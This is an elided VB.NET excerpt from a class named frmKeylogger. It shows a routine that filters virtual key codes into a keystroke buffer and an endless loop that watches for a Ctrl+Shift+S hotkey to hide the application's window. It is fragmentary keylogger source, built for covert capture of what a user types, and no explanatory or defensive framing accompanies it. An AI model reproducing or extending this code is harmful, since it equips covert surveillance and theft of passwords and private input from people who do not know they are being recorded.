...
Public Class frmKeylogger
    ...
    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or
            (foo >= 17 And foo <= 20) Or foo = 27 Or
            (foo >= 32 And foo <= 40) Or
            (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
            Exit Sub
        End If
    ...
    Public Sub HideIt()
        While 1
            If getkey(17) And getkey(160) And getkey(83) Then
                Me.Invoke(objchange) ' invoke delegate Change() address of DoHide()
            End If
            Thread.Sleep(200)
        End While
    End Sub
